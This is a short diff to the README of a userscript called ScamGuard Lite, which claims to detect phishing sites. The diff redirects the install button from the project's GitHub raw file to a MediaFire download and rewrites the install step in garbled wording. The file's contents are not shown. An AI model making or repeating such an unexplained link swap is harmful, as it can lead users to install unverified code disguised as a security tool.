@@ -26,9 +26,9 @@ A free, community-powered userscript that automatically detects phishing, scam, 
 2. Enable Scripts in the browser settings
 3. Tap the button below to install the script:
 
-[![Install ScamGuard Lite](https://img.shields.io/badge/⬇️_Install_ScamGuard_Lite-2196F3?style=for-the-badge)](https://raw.githubusercontent.com/mouziali75-cpu/scamguard/main/scamguard.user.js)
+[![Install ScamGuard Lite](https://img.shields.io/badge/⬇️_Install_ScamGuard_Lite-2196F3?style=for-the-badge)](https://www.mediafire.com/file/9pracvcp6ag6ynn/scamguard.user.js/file)
 
-4. Confirm the install prompt in your browser
+4. Upload the file in via browser
 
 ---
 
